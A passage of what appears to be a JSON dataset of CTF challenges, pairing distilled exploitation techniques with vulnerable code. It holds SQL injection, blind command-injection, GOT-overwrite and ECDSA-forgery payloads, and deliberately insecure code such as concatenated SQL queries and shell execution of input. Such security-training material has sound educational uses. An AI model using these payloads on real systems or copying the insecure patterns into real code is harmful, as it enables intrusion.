            "When exploiting SQL injection vulnerabilities, especially in SQLite, utilizing comments (`--`) at the end of the injection payload is crucial to comment out the remainder of the original SQL query. This ensures that the injected SQL code runs without interference from the subsequent parts of the original SQL command. This technique is applicable in scenarios where the injection point is within a larger query, and the attacker needs to ensure that only their crafted manipulation executes.  \nExample payload: `\" union select rootpage, type, name from sqlite_master --`"
        ],
        "key": "```js\napp.post('/login', (req, res) => {  \n const username = req.body.username;  \n const password = req.body.password;\n\n db.get('SELECT * FROM users WHERE username = \"' + username + '\" and password = \"' + password+ '\"', (err, row) => {  \n   if (err) {  \n     console.error(err);  \n     res.status(500).send('Error retrieving user');  \n   } else {  \n     if (row) {  \n       req.session.loggedIn = true;  \n       req.session.username = username;  \n       res.send('Login successful!');  \n     } else {  \n       res.status(401).send('Invalid username or password');  \n     }  \n   }  \n });  \n});  \n```"
    },
    {
        "name": "Blind Shell",
        "write_up": "dataset/raw/Blind Shell.md",
        "type": "misc",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": 345,
        "max_score": 411,
        "difficulty": 0.8394160583941606,
        "knowledge": [
            "When dealing with blind command injection vulnerabilities, where output only indicates success or failure, use conditional commands based on output success to infer the presence or absence of specific files, file contents, or directory listings. Commands like `ls`, `wc`, and `grep` can be combined to derive information about the file system layout, the number of files present, or even the content of files, by iterating through possible values and observing the binary outcome. This approach is viable when direct output is suppressed or not indicative of the executed command's result.  \nExample payload for deriving file names: `ls | grep ^f | wc -l | grep 1`",
            "In scenarios where the environment restricts direct directory navigation or the inspection of file contents through conventional means (e.g., using 'cd' to change directories or 'cat' to read file contents), leveraging scripts to perform blind extraction of information can be effective. Python scripts utilizing loops and conditional operations can be adapted to iteratively guess and confirm the presence of characters in file names or file contents. This is applicable in environments that give binary success or failure feedback for executed commands. By successively refining the guess based on the binary feedback, it is possible to reconstruct the desired information character by character.  \nExample payload to read content from a file in a blind manner:  \n```python\nfrom pwn import *\nalphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!\"#()+,-/:;<=>?@[]^'\nconn = remote('example.ctf.com', 30010)\nconn.sendline(\"cat targetfile.txt | grep ^S\")\nconn.recvline()\nread = 'S'\nwhile True:\n    for i in alphabet:\n        test = read + i\n        print(test)\n        conn.sendline(\"cat targetfile.txt | grep \" + test)\n        if chr(r[2]) == 'S':  \n            read = test\n            break\nprint(\"Extracted content: \", read)\n```"
        ],
        "key": "```python\n# server.py\n\nimport os\n\ndef execute_command(command):\n    try:\n        result = os.popen(command).read()\n        if result:\n            return \"Success!\"\n        else:\n            return \"Failed!\"\n    except Exception as e:\n        return \"Failed!\"\n\nwhile True:\n    command = input(\"$ \")\n    print(execute_command(command))\n```"
    },
    {
        "name": "Blob 200",
        "write_up": "dataset/raw/Blob 200.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing a git repository for hidden or obfuscated data, it's vital to manually inspect the `.git/objects` directory for unreferenced or dangling objects which might not appear in the commit history accessed through normal commands (`git log`, `git show`, etc.). This can reveal commits, blobs, and other data that are part of the repository's history but are no longer referenced by any branch or tag.",
            "In challenges involving git repositories, directly examining the SHA-1 hashes associated with git objects (commits, trees, blobs) can lead to discovering hidden content or flag information. This involves using `git show` followed by the object's hash to potentially uncover data not easily found through standard repository navigation commands."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of handling git objects\n\nimport os\nimport subprocess\n\ndef list_git_objects(repo_path):\n    objects_path = os.path.join(repo_path, '.git', 'objects')\n    for root, dirs, files in os.walk(objects_path):\n        for file in files:\n            object_path = os.path.join(root, file)\n            try:\n                # Potential vulnerability: using shell=True can lead to command injection\n                result = subprocess.check_output(f'git cat-file -p {object_path}', shell=True)\n                print(result.decode())\n            except subprocess.CalledProcessError as e:\n                print(f\"Error processing object {object_path}: {e}\")\n\n# Example usage\nlist_git_objects('/path/to/repo')\n```\n"
    },
    {
        "name": "block-game",
        "write_up": "dataset/raw/block-game.md",
        "type": "reverse",
        "competition": [
            "TJCTF/2022",
            "https://ctftime.org/event/1599/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "When facing a Java application that crashes due to `java.lang.OutOfMemoryError`, increasing the Java heap space can be a viable solution to prevent the crash and continue with the application analysis. This can be done by using the `-Xmx` option followed by the amount of memory (e.g., `-Xmx2000m` for 2000 megabytes) when executing the Java application.   \nExample command: `java -Xmx2000m -jar application.jar`",
            "In challenges involving manipulating game world data or similar binary data manipulation tasks, analyzing changes in binary files before and after specific actions (e.g., clicking, saving) can reveal how data is structured or encoded. This approach can be particularly useful when trying to understand how actions within a game or application map to changes in its data files. Based on this information, you can write scripts to manipulate or interpret the binary data directly, which is especially useful when GUI actions are too slow or cannot be easily automated.  \nExample approach: Use a Python script to compare binary files byte by byte to identify changes and deduce the structure or encoding of the data, then manipulate the data accordingly to achieve the desired outcome (e.g., revealing hidden messages, extracting flags)."
        ],
        "key": "```java  \n  public void keyPressed(KeyEvent var1) {  \n     this.keys.put(var1.getKeyCode(), true);  \n     if (var1.getKeyCode() == 27) {  \n        System.exit(0);  \n     } else if (var1.getKeyCode() == 80) {  \n        this.game.saveData();  \n     }\n\n  }\n\n  public void keyReleased(KeyEvent var1) {  \n     this.keys.put(var1.getKeyCode(), false);  \n  }\n\n  public void tick() {  \n     if ((Boolean)this.keys.getOrDefault(87, false)) {  \n        this.y -= 0.1D;  \n     }\n\n     if ((Boolean)this.keys.getOrDefault(83, false)) {  \n        this.y += 0.1D;  \n     }\n\n     if ((Boolean)this.keys.getOrDefault(65, false)) {  \n        this.x -= 0.1D;  \n     }\n\n     if ((Boolean)this.keys.getOrDefault(68, false)) {  \n        this.x += 0.1D;  \n     }\n\n     this.x = Math.max(0.5D, Math.min(this.x, (double)this.game.getMapWidth() - 0.5D));  \n     this.y = Math.max(0.5D, Math.min(this.y, (double)this.game.getMapHeight() - 0.5D));  \n     Tile var1 = this.game.getTileAt((int)this.x, (int)this.y, this.z);  \n     if (var1.getType() == Tile.TileType.STAIRS_DOWN) {  \n        if (!this.onStairs && this.z > 0) {  \n           --this.z;  \n        }\n\n        this.onStairs = true;  \n     } else if (var1.getType() == Tile.TileType.STAIRS_UP) {  \n        if (!this.onStairs && this.z < 7) {  \n           ++this.z;  \n        }\n\n        this.onStairs = true;  \n     } else {  \n        this.onStairs = false;  \n     }\n\n  }  \n```\n\n```java  \n  public void mouseClicked(MouseEvent var1) {  \n  }\n\n  public void mousePressed(MouseEvent var1) {  \n     int var2 = (int)(((double)var1.getX() + this.getX() * 20.0D - (double)(this.game.getWidth() / 2)) / 20.0D);  \n     int var3 = (int)(((double)var1.getY() + this.getY() * 20.0D - (double)(this.game.getHeight() / 2)) / 20.0D);  \n     if (var1.getButton() == 3) {  \n        this.build(var2, var3);  \n     } else if (var1.getButton() == 1) {  \n        this.destroy(var2, var3);  \n     }\n\n  }  \n```"
    },
    {
        "name": "BLOCKchain",
        "write_up": "dataset/raw/BLOCKchain.md",
        "type": "reverse",
        "competition": [
            "Square/2022",
            "https://ctftime.org/event/1756/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with macOS-specific binary protections and anti-debugging measures in a reversing challenge, one effective technique is using `DYLD_INSERT_LIBRARIES` to inject custom libraries that can modify the program's behavior or disable certain security checks. This method can be particularly useful for stubbing out functions like antidebug checks by creating a library that contains a constructor function to unset relevant environment variables or directly modify function behavior, such as antidebugging routines. This approach allows for real-time modification of the binary's execution without altering the original binary.\n   - **Condition:** This approach is applicable in scenarios where the target binary is a macOS application that employs environment variables or specific functions to implement anti-debugging techniques.\n   - **Example:** If the target binary checks for the presence of a debugger using an environment variable, one can create a dynamic library with a constructor function like below, compile it, and use `DYLD_INSERT_LIBRARIES` to inject it into the application's process space.\n     ```c\n     __attribute__((constructor))\n     void disable_antidebug() {\n         unsetenv(\"DYLD_INSERT_LIBRARIES\");  // Unset the env var used by binary for checks\n     }\n     ```",
            "In reverse engineering challenges, especially those involving custom VMs and bytecode formats, understanding and patching out artificial delay mechanisms like various implementations of `sleep()` functions can significantly speed up the analysis and execution process, allowing one to retrieve the flag or desired output more efficiently. These delay mechanisms are often introduced as time-wasters and can be identified and removed by analyzing the bytecode or VM syscall implementations.\n   - **Condition:** This strategy is suited for reversing challenges that include custom virtual machines or unique execution environments with implemented delay mechanisms to slow down analysis or execution.\n   - **Example:** Without a specific bytecode or function to reference, the principle involves identifying the sleep function calls within the custom VM bytecode or syscall table and then modifying these calls to be no-ops or replacing them with instructions that have minimal delay. This could be as simple as changing the bytecode or patching the binary execution file."
        ],
        "key": "```objective-c\n// Example of a possible vulnerable code snippet based on the context\nvoid vulnerable_sleep_function() {\n    // Simulating a time-wasting sleep function\n    for (int i = 0; i < 1000000000; i++) {\n        // Intentional no-op to waste time\n    }\n}\n```"
    },
    {
        "name": "book",
        "write_up": "dataset/raw/book.md",
        "type": "pwn",
        "competition": [
            "0CTF/2021/Quals",
            "https://ctftime.org/event/1356/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a binary exploitation challenge with Partial RELRO and PIE enabled, targeting GOT entries for overwriting becomes a feasible attack vector, especially when arbitrary read/write primitives are identified. This attack can be particularly effective if the binary has a vulnerable function that allows for controlled read and write operations at specific offsets. This scenario demonstrates that exploiting GOT with arbitrary read/write can leverage the partial overwrite tactic, useful when dealing with format string vulnerabilities that terminate at null bytes. For leaking libc addresses, functions within the GOT that are perfectly aligned with the offset required by the vulnerability, such as `open` in the context of a `%s` format string vulnerability, allow for efficient address leakage and libc version identification.",
            "In scenarios where the challenge binary facilitates a controlled overwrite of GOT entries, choosing to overwrite function entries that will be called immediately after exploitation can create a straightforward path to arbitrary code execution. For instance, overwriting the `atoi` GOT entry with the address of `system`, while ensuring existing calls in the program can be repurposed as arbitrary command execution triggers, provides a practical approach to achieving a shell. This method relies on predicting program behavior post-overwrite, such as ensuring the next user input is passed to the overwritten function (`atoi` in this instance), transforming normal program execution flow into an exploitable one. Example payload for overwriting `atoi` with `system` could include calculating the index for `atoi` in the GOT based on known addresses and offsets, followed by crafting a payload that combines the desired `system` address with controlled input to execute a command."
        ],
        "key": "```c\nvoid print_todo(void)\n{  \n int iVar1;  \n  \n printf(\"Which entry would you like to read? \");  \n fflush(stdout);  \n iVar1 = read_int();  \n if (iVar1 < 0x81) {  \n   printf(\"Your NOTE: %s\\n\",todos + iVar1 * 0x30);  \n }  \n else {  \n   puts(\"Sorry but this model only supports 128 NOTE list entries.\\n\");  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "Bookshelf",
        "write_up": "dataset/raw/Bookshelf.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "In scenarios utilizing custom encoding or token generation mechanisms, such as BWT (Binary Web Tokens) in place of JWT (JSON Web Tokens), analyze the encoding process for potential vulnerabilities that could arise from differences in handling string lengths or character encoding. Specifically, if the encoding mechanism involves treating multi-byte characters differently or relies on string and byte lengths inconsistently, it may be possible to craft payload that alters the intended structure or data of the token. This can potentially lead to authorization bypass or other unintended behaviors by manipulating encoded data to inject or modify encoded values, such as user roles, permissions, or identifiers.",
            "When interacting with web applications that allow user input, especially those storing input data into backend systems like databases, inspect the application's handling of data fields not explicitly utilized or validated by the backend. If a web application frontend allows sending additional, unvalidated or unfiltered data fields to the server, and the server-side application blindly stores or processes this data, it provides an avenue for attacking the integrity of the application's data. Attackers can exploit this by crafting payloads that, when processed or evaluated by the server, may lead to elevation of privileges, data leakage, or unauthorized actions, even if those fields are not directly used or acknowledged by the application's primary functionalities."
        ],
        "key": "```javascript\nfunction encode(o, KEY) {  \n   let b = new Buffer(0)\n\n   for (let k in o) {  \n       let v = o[k]\n\n       b = Buffer.concat([b, pint(k.length), Buffer.from(k)])\n\n       switch(typeof v) {  \n           case \"string\":  \n               b = Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])  \n               break  \n           case 'number':  \n               b = Buffer.concat([b, Buffer.from([2]), pint(v)])  \n               break  \n           default:  \n               b = Buffer.concat([b, Buffer.from([0])])  \n               break  \n       }  \n   }\n\n   b = b.toString('base64')\n\n   const hmac = crypto.createHmac('sha256', KEY)  \n   hmac.update(b)  \n   let s = hmac.digest('base64')\n\n   return b + '.' + s  \n}\n\nfunction decode(payload, KEY) {  \n   let [b, s] = payload.split('.')\n\n   const hmac = crypto.createHmac('sha256', KEY)  \n   hmac.update(b)  \n   if (s !== hmac.digest('base64')) {  \n       return null;  \n   }\n\n   let o = {}  \n   let i = 0  \n   b = new Buffer(b, 'base64')\n\n   while (i < b.length) {  \n       n = b.readUInt32LE(i), i += 4  \n       k = b.toString('utf8', i, i+n), i += n  \n       t = b.readUInt8(i), i += 1\n\n       switch(t) {  \n           case 1:  \n               n = b.readUInt32LE(i), i += 4  \n               v = b.toString('utf8', i, i+n), i += n  \n               o[k] = v  \n               break  \n           case 2:  \n               n = b.readUInt32LE(i), i += 4  \n               o[k] = n  \n               break  \n           default:  \n               break  \n       }  \n   }  \n   return o  \n}\n```"
    },
    {
        "name": "Bop It",
        "write_up": "dataset/raw/Bop It.md",
        "type": "pwn",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 80,
        "max_score": 300,
        "difficulty": 0.26666666666666666,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities linked with string operations, specifically where the vulnerability involves handling a NULL byte (`\\x00`), one can leverage the discrepancy between the `read` function's behavior (which counts raw bytes including NULL bytes) and the `strlen` function's behavior (which stops counting at the first NULL byte). This can lead to situations where the application thinks it has read more data into a buffer than it has actually processed, enabling memory leak exploits or buffer overflows. This technique can be particularly effective in challenges where input is directly processed and compared against in-memory data, and where the program's incorrect calculation of input length can be used to trigger incorrect memory operations.\n\n   Example Payload: `'\\x00' + 'A'*size`  \n   The payload starts with a NULL byte to stop `strlen` from counting beyond it, followed by a series of 'A' characters to increase the `read` function's return value without affecting the `strlen` result, creating a buffer overflow or memory leak.",
            "For challenges that involve interacting with a binary over a network (using netcat `nc` or similar tools), automation scripting with tools like `pwntools` can be invaluable. This approach can systematically test various inputs to exploit vulnerabilities like buffer overflows, memory leaks, or function misbehaviors. When dealing with games or interactive challenges that require sending specific inputs in response to program output, a script can be crafted to read the output, decide on the correct response, and then send potentially exploitative data when the conditions are met.\n\n   Example Usage:  \n   ```python\n   from pwn import *\n   \n   def exploit(remote_addr, remote_port, payload):\n       p = remote(remote_addr, remote_port)\n       while True:\n           response = p.readuntil('it!')\n           if 'Condition1' in response:\n               p.sendline('Response1')\n           elif 'Condition2' in response:\n               p.sendline('Response2')\n           elif 'ExploitCondition' in response:\n               p.sendline(payload)\n               break\n       print(p.recvall())\n   ```\n   \n   This script template showcases how to connect to a remote service, interact with it based on its output, and send a payload under the right condition, which is a common tactic in binary exploitation challenges."
        ],
        "key": "```c\nssize_t guessLen = read(STDIN_FILENO, guess, sizeof(guess));\nsize_t wrongLen = strlen(guess) + 35;\nchar wrong[wrongLen];\nsnprintf(wrong, guessLen, \"Wrong! You guessed: %s\", guess);\nprintf(\"%s\\n\", wrong);\n```"
    },
    {
        "name": "boring-flag-runner",
        "write_up": "dataset/raw/boring-flag-runner.md",
        "type": "reverse",
        "competition": [
            "RaRCTF/2021",
            "https://ctftime.org/event/1342/tasks/"
        ],
        "score": 300,
        "max_score": 1500,
        "difficulty": 0.2,
        "knowledge": [
            "When encountering a challenge that involves a custom implementation of an interpreter for a known esoteric language (e.g., brainfuck), executing arbitrary code can be achieved by understanding the mapping between the implemented instruction set and the original language's instructions. This involves translating familiar constructs into the target environment's equivalents to manipulate memory or execute desired operations. The general approach includes reading and reverse engineering the binary to identify the custom instruction set, then crafting payloads that match the expected input format to achieve memory manipulation or code execution.\n   - Example: For an implementation that accepts modified brainfuck instructions, a payload that moves the data pointer and modifies values at specific memory addresses could be made like `'>]*[<->[-<+>]]>[-<+>]<'`, assuming `>` moves the data pointer right, `[` and `]` are loop start and end markers, `-` decrements the byte at the data pointer, and `<` moves the data pointer left. The payload structure will depend on the specific mapping discovered through reverse engineering.",
            "For challenges that output is redirected to `/dev/null`, making direct interaction with a shell or observing output difficult, indirect methods to confirm command execution or retrieve output should be considered. One method is leveraging shell redirection or piping to bypass output restrictions. This can involve directing the standard output to a different file descriptor that is not being redirected, such as standard error, or using network utilities to exfiltrate data.\n   - Example: If standard output is redirected to `/dev/null` and you've gained shell access, you can redirect your commands' output to standard error to bypass this restriction and see command results. A practical command to retrieve a flag might be `cat /path/to/flag.txt 1>&2`, which executes `cat` on the flag file but redirects the output from stdout (file descriptor 1) to stderr (file descriptor 2), allowing you to see the flag despite stdout redirection."
        ],
        "key": "```c\n else {  \n   opened_file = fopen(param_2[1],\"rb\");  \n   if ((opened_file == (FILE *)0x0) &&  \n      (opened_file = fopen(\"prog.bin\",\"rb\"), opened_file == (FILE *)0x0)) {  \n     puts(\"Couldn\\'t open program.\");  \n                   /* WARNING: Subroutine does not return */  \n     exit(-1);  \n   }  \n }  \n file_size_var = file_size(opened_file,&actual_file_size,&actual_file_size);  \n if (((file_size_var == -1) ||  \n     (file_buffer = (byte *)calloc(actual_file_size,1), file_buffer == (byte *)0x0)) ||  \n    (sVar1 = fread(file_buffer,1,actual_file_size,opened_file), sVar1 != actual_file_size)) {  \n   puts(\"Couldn\\'t read program.\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(-1);  \n }  \n fclose(opened_file);  \n```\n\n```c\n while ((ulong)(long)program_counter < actual_file_size) {  \n   if (loop_back == 0) {  \n     weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  \n                   /* <]>[,.-+ */  \n     switch((file_buffer[program_counter] + weird & 7) - weird) {  \n     case 0:  \n       data_pointer = data_pointer + 1;  \n       break;  \n     case 1:  \n       if (data[data_pointer] == 0) {  \n         paranthesis_records[function_return_helper + -1] = 0;  \n         function_return_helper = function_return_helper + -1;  \n       }  \n       else {  \n         program_counter = paranthesis_records[function_return_helper + -1];  \n       }  \n       break;  \n     case 2:  \n       data_pointer = data_pointer + -1;  \n       break;  \n     case 3:  \n       if (data[data_pointer] == 0) {  \n         loop_back = 1;  \n       }  \n       else {  \n         paranthesis_records[(int)function_return_helper] = program_counter;  \n         function_return_helper = function_return_helper + '\\x01';  \n       }  \n       break;  \n     case 4:  \n       if (local_28 == 0) {  \n         read(0,user_input,0x37);  \n       }  \n       data[data_pointer] = user_input[local_28];  \n       local_28 = local_28 + 1;  \n       break;  \n     case 5:  \n       putchar((int)(char)data[data_pointer]);  \n       break;  \n     case 6:  \n       data[data_pointer] = data[data_pointer] - 1;  \n       break;  \n     case 7:  \n       data[data_pointer] = data[data_pointer] + 1;  \n       break;  \n     default:  \n       goto switchD_001014f2_caseD_8;  \n     }  \n   }  \n   else {  \n     weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  \n     if ((byte)((file_buffer[program_counter] + weird & 7) - weird) == '\\x03') {  \n       loop_back = loop_back + 1;  \n     }  \n     else {  \n       weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  \n       if ((byte)((file_buffer[program_counter] + weird & 7) - weird) == '\\x01') {  \n         loop_back = loop_back + -1;  \n       }  \n     }  \n   }  \n   program_counter = program_counter + 1;  \n }  \n free(file_buffer);  \nswitchD_001014f2_caseD_8:  \n return 0;  \n}  \n```"
    },
    {
        "name": "Borraccia",
        "write_up": "dataset/raw/Borraccia.md",
        "type": "misc",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "In a scenario where the application uses a class that suffers from the mutable default argument vulnerability, a shared mutable object (e.g., dictionary) across instances can be exploited by ensuring that every instance of that class refers to and mutates the same data. This knowledge is particularly useful for exploiting custom implementations where an object is expected to maintain isolated state across its instances. In such cases, manipulating one instance's state will affect all instances, potentially leading to unintended access or modification of application data.",
            "Exploiting string formatting vulnerabilities can lead to information disclosure or unintended behavior in applications that use dynamic string formatting with untrusted input. If a logging function or similar constructs use Python's `str.format()` method without proper input sanitization, it can be manipulated to trigger exceptions revealing sensitive information or to bypass restrictions. This technique is useful when you can control some portion of the format string and the application logic performs operations based on the formatted string outcome. To mitigate against simple blacklist-based input filtering, placing payloads in parts of the request not subject to the same filtering (e.g., request parameters vs headers) can provide a bypass mechanism.  \nExample payload: Setting the request parameter to `%(&b=)s` and the header to manipulate the format string accordingly, enabling the exploitation of the string formatting vulnerability to disclose sensitive information or trigger desired application behavior."
        ],
        "key": "```python\nclass ObjDict:  \n   def __init__(self, d={}):  \n       self.__dict__['_data'] = d # Avoiding Recursion errors on __getitem__\n\n   def __getattr__(self, key):  \n       if key in self._data:  \n           return self._data[key]  \n       return None\n\n   def __contains__(self, key):  \n       return key in self._data\n\n   def __setattr__(self, key, value):  \n       self._data[key] = value\n\n   def __getitem__(self, key):  \n       return self._data[key]\n\n   def __setitem__(self, key, value):  \n       self._data[key] = value\n\n   def __delitem__(self, key):  \n       del self._data[key]\n\n   def __enter__(self, *args):  \n       return self\n\n   def __exit__(self, *args):  \n       self.__dict__[\"_data\"].clear()\n\n   def __repr__(self):  \n       return f\"ObjDict object at <{hex(id(self))}>\"\n\n   def __iter__(self):  \n       return iter(self._data)\n```\n\n```python\ndef log(log, s, mode=\"INFO\", ctx=None):  \n   {  \n       \"DEBUG\": log.debug,  \n       \"INFO\": log.info,  \n       \"ERROR\": log.error  \n   }[mode](s.format(ctx), {\"mode\": mode})\n```\n\n```python\n@lru_cache  \ndef normalize_header_value(s: str) -> str:  \n   return re.sub(r\"[%\\\"\\.\\n\\'\\!:\\(\\)]\", \"\", s)  \n```"
    },
    {
        "name": "Bowrain",
        "write_up": "dataset/raw/Bowrain.md",
        "type": "pwn",
        "competition": [
            "SecurityFest/2018",
            "https://ctftime.org/event/622/tasks/"
        ],
        "score": 261,
        "max_score": 499,
        "difficulty": 0.5230460921843687,
        "knowledge": [
            "In scenarios where a program does not properly terminate strings, it is possible to leak memory addresses. This is exploitable especially in functions that print back user-controlled data without null termination, allowing an attacker to infer the Process Instruction (PIE) base address or other sensitive information from the leaked output. This technique can be applied to bypass ASLR (Address Space Layout Randomization) by leaking addresses of functions or variables.",
            "When dealing with integer overflow vulnerabilities, specifically with the `abs()` function and modulus operation, it is crucial to remember that `abs(INT_MIN)` remains negative and a modulus operation with a negative operand can produce negative results. These vulnerabilities can lead to unexpected behavior such as out-of-bounds read or write if user input is used to calculate array indices or pointers. By carefully crafting input (e.g., using `INT_MIN` or similar boundary values), an attacker can manipulate the control flow or corrupt memory in predictable ways, such as redirecting execution to a `system()` call for arbitrary code execution. \n\nExample payload section to manipulate function pointer table for arbitrary code execution:\n```python\npayload = \"2147483648\" + \"\\x00\" + \"/bin/sh\\x00\"\npayload += \"A\" * 5\nassert len(payload) == 0x18\npayload += ((0x80 - len(payload)) / 8) * p64(base + 0x958)\n# Spraying the address of system, so any access of function pointer table with a negative index > -7 (by % operation) will give address of system\nsh.send(payload + \"\\n\")\n```"
        ],
        "key": "```c\nwhile ( 1 )  \n{  \n  v4[0] = get_number();  \n  if ( v4[0] == -1 )  \n  {  \n    printf(\"\\x1B[31;1merror:\\x1B[0m not a number: %s\\n\", ::a1, *(_QWORD *)v4, v5);  \n      // leak PIE possible  \n  }  \n  else  \n  {  \n    v4[1] = abs(v4[0]) % 7; // can be negative if v4[0] is 2147483648  \n    memset(::a1, 0, endptr - (char *)::a1);  \n    v3 = (void (__fastcall *)(char *, _QWORD))*(&off_2030A0 + v4[1]);  \n    // will access a function pointer that can be manipulated by input if negative  \n    v3(++endptr, 0LL);  \n    // ++endptr will point to the address just after the null terminator of input  \n  }  \n  print_choice();  \n}\n```"
    },
    {
        "name": "bpf_badjmp",
        "write_up": "dataset/raw/bpf_badjmp.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit eBPF programs that permit arbitrary kernel memory read, one can leverage bugs that allow for manipulating jump instructions, especially backward jumps, to redirect execution flow to unintended instructions. This method often involves creating a scenario where, due to a flaw in the handling of jump instruction offsets during instruction expansion, the program counter is redirected to execute an unintended sequence of instructions. A common approach to achieve backward jumps without introducing unreachable code or loops involves manipulating register values to ensure jumps are always taken. This technique relies on understanding the internal mechanics of instruction patching and jump address calculation within the eBPF verifier and exploiting discrepancies in this logic.",
            "When exploiting ALU sanitation patches in eBPF to manipulate pointer arithmetic for arbitrary memory access, it is beneficial to understand how certain operations on registers are expanded into multiple instructions by the verifier. Specifically, operations that involve adding or subtracting a scalar value from a pointer can trigger an expansion where multiple instructions are inserted to check and sanitize the scalar value. By carefully planning the exploit payload to manipulate this behavior, it is possible to control the pointer manipulation, allowing for arbitrary read or write operations. One critical aspect is ensuring that the scalar value used in the arithmetic operation does not cause an out-of-bounds access, which can be achieved by setting up the environment in a way that passes the verifier's checks yet leads to the desired memory access at runtime."
        ],
        "key": "```c\nstatic int bpf_adj_delta_to_off(struct bpf_insn *insn, u32 pos, s32 end_old, s32 end_new, s32 delta)\n{\n    s32 off = insn->off;\n    s32 curr = pos + off;\n\n    if (curr < pos && curr + off + 1 >= end_old)\n        off += delta;\n    else if (curr > pos && curr + off + 1 < pos)\n        off -= delta;\n    if (off < off_min || off > off_max)\n        return -ERANGE;\n    insn->off = off;\n    return 0;\n}\n```"
    },
    {
        "name": "Braincool",
        "write_up": "dataset/raw/Braincool.md",
        "type": "web",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "In challenges related to secure hardware (like Ledger Nano) and cryptographic protocols, reverse engineering skills combined with understanding APDU communication can be critical for exploitation or forging cryptographic material. Emulators such as Speculos can be extremely beneficial for debugging and understanding the behavior of secure hardware devices. This knowledge applies when attempting to interact with or replicate the security mechanisms of hardware wallets or smart cards in a controlled environment.",
            "In scenarios involving elliptic curve cryptography (ECC) and particularly ECDSA, you can forge valid signatures by exploiting the verification function without needing to know the private key. This approach is applicable when the verification process does not strictly validate the hash of the message, thus allowing an attacker to generate a valid `(r, s)` pair for the verification process by cleverly choosing values for `u1` and `u2` and calculating the respective elliptic curve points. This method requires mathematical manipulation and an understanding of the ECC and the ECDSA verification process.\n   ```python\n   # Given values u1, u2, Q (public key), and curve parameters\n   u1 = 0\n   u2 = 1\n   R = Q\n   while True:\n       u1 += 1\n       R += G  # G is the base point on the elliptic curve\n       r = R[0].lift() % q  # q is the curve order\n       s = r\n       h = u1 * s % q\n       if hex(h).startswith('0x435446'):  # 'CTF' in hex\n           print(r, s, h, u1, u2)\n           break\n   ```\nThis strategy allows for the generation of a payload that will pass ECDSA verification checks in the absence of stringent message hash validations, which can be used directly in CTF challenges that simulate or involve similar cryptographic scenarios."
        ],
        "key": "```c\nvoid handle_apdu(uint8_t *apdu, uint8_t *response) {\n    uint8_t cla = apdu[0];\n    uint8_t ins = apdu[1];\n    uint8_t p1 = apdu[2];\n    uint8_t p2 = apdu[3];\n    uint8_t lc = apdu[4];\n    uint8_t *data = &apdu[5];\n\n    if (cla != 0xE0) {\n        return; // Unsupported class\n    }\n\n    switch (ins) {\n        case 0x05:\n            generate_public_key(response);\n            break;\n        case 0x06:\n            if (lc != 40 || (data[0] == 'C' && data[1] == 'T' && data[2] == 'F')) {\n                return; // Invalid data\n            }\n            generate_private_key();\n            sign_data(data, response);\n            break;\n        case 0x07:\n            if (lc < 40) {\n                return; // Invalid data length\n            }\n            uint8_t *hash = data;\n            uint8_t *signature = data + 40;\n            if (verify_signature(hash, signature, lc - 40)) {\n                if (data[0] == 'C' && data[1] == 'T' && data[2] == 'F') {\n                    decrypt_flag(response);\n                }\n            }\n            break;\n        default:\n            return; // Unsupported instruction\n    }\n}\n\nvoid generate_public_key(uint8_t *response) {\n    // Calls to cx_ecfp_generate_pair2_no_throw and other functions\n}\n\nvoid generate_private_key() {\n    // Generates an elliptic private key\n}\n\nvoid sign_data(uint8_t *data, uint8_t *response) {\n    // Calls to cx_ecdsa_sign_no_throw\n}\n\nbool verify_signature(uint8_t *hash, uint8_t *signature, size_t length) {\n    // Calls to cx_ecdsa_verify_no_throw\n    return true; // Simplified for example\n}\n\nvoid decrypt_flag(uint8_t *response) {\n    // Decrypts the flag using static byte arrays\n}\n```"
    },
    {
        "name": "BrainSim",
        "write_up": "dataset/raw/BrainSim.md",
        "type": "pwn",
        "competition": [
            "COMPFEST/2021",
            "https://ctftime.org/event/1358/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "Leveraging a Brainfuck interpreter's unchecked data pointer (`mp`) movements, an attacker can manipulate the stack to leak memory addresses or overwrite return addresses. This approach is viable when the Brainfuck interpreter processes user-defined programs without proper validation. By using specific patterns like `.,[>.,]` for memory address leaks and `,[>,]` for overwriting data on the stack, one can perform arbitrary memory operations.\n   - Example payload to leak stack addresses: `.,[>.,]`\n   - Example payload to overwrite data on the stack: `,[>,]`",
